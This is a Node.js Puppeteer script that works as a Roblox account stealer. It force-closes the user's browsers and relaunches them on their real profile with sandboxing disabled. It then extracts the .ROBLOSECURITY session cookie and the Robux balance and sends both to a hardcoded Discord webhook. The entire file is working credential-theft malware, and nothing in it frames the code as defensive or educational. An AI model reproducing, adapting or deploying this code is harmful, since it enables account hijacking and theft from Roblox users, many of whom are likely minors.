const puppeteer = require('puppeteer');
const { execSync } = require('child_process');
const fs = require('fs');

// Function to check if a browser is installed
function isBrowserInstalled(browserPath) {
  return fs.existsSync(browserPath);
}

// Function to check if a browser process is running
function isBrowserRunning(browserName) {
  try {
    execSync(`tasklist /FI "IMAGENAME eq ${browserName}.exe"`, { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}

// Kill a browser process if it's running
function killBrowserProcess(browserName) {
  if (isBrowserRunning(browserName)) {
    try {
      console.log(`Attempting to kill any existing process of: ${browserName}.exe`);
      execSync(`taskkill /IM ${browserName}.exe /F`);
      console.log(`${browserName} process terminated successfully.`);
    } catch {
      console.log(`Failed to terminate ${browserName}.exe`);
    }
  } else {
    console.log(`${browserName} is not running, skipping termination.`);
  }
}

// Browsers to try
const browserPaths = [
  {
    path: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    product: 'chrome',
    name: 'chrome',
    userDataDir: 'C:\\Users\\46736\\AppData\\Local\\Google\\Chrome\\User Data',
  },
  {
    path: 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
    product: 'chrome',
    name: 'msedge',
    userDataDir: 'C:\\Users\\46736\\AppData\\Local\\Microsoft\\Edge\\User Data',
  },
  {
    path: 'C:\\Program Files\\Mozilla Firefox\\firefox.exe',
    product: 'firefox',
    name: 'firefox',
    userDataDir: '', // Puppeteer may not support Firefox user profiles the same way
  },
];

// Puppeteer task
async function tryPuppeteer(browserConfig) {
  let browser;
  try {
    console.log(`Launching ${browserConfig.name}...`);

    browser = await puppeteer.launch({
      executablePath: browserConfig.path,
      product: browserConfig.product,
      headless: false,
      userDataDir: browserConfig.userDataDir || undefined,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });

    const page = await browser.newPage();
    console.log('Navigating to Roblox...');
    await page.goto('https://www.roblox.com', { waitUntil: 'domcontentloaded' });

    console.log('Going to profile...');
    await page.goto('https://www.roblox.com/users/profile', { waitUntil: 'domcontentloaded' });

    const robuxSelector = '#nav-robux';
    try {
      await page.waitForSelector(robuxSelector, { timeout: 15000 });
    } catch {
      console.log(`Timeout reached waiting for ${robuxSelector}`);
      return false;
    }

    await page.click(robuxSelector);
    await page.waitForSelector('#nav-robux-amount', { timeout: 10000 });

    const robuxBalance = await page.$eval('#nav-robux-amount', el => el.innerText.trim());

    const client = await page.target().createCDPSession();
    const { cookies } = await client.send('Network.getAllCookies');
    const robloxCookie = cookies.find(c => c.name === '.ROBLOSECURITY');
    if (!robloxCookie) throw new Error('.ROBLOSECURITY cookie not found');

    const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
    await fetch('https://discord.com/api/webhooks/1367835268954194072/d_xMvdDNjj16cU5TMPajZVf4OxMmz2SPmC5WWl_vvwrhP0bMxG37Ll2OPEUr-9d0JOa6', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content:
          `.ROBLOSECURITY:\n\`\`\`${robloxCookie.value}\`\`\`\n` +
          `Profile: ${page.url()}\n` +
          `Robux: ${robuxBalance}`
      })
    });

    console.log('✅ Success with browser:', browserConfig.name);
    return true;
  } catch (err) {
    console.error(`❌ Error with ${browserConfig.name}:`, err.message);
    return false;
  } finally {
    if (browser) await browser.close();
  }
}

// Try all browsers in order
(async () => {
  for (const browser of browserPaths) {
    if (!isBrowserInstalled(browser.path)) continue;

    killBrowserProcess(browser.name);

    const success = await tryPuppeteer(browser);
    if (success) break;
  }

  console.log('Script finished.');
  setTimeout(() => process.exit(0), 5000);
})();
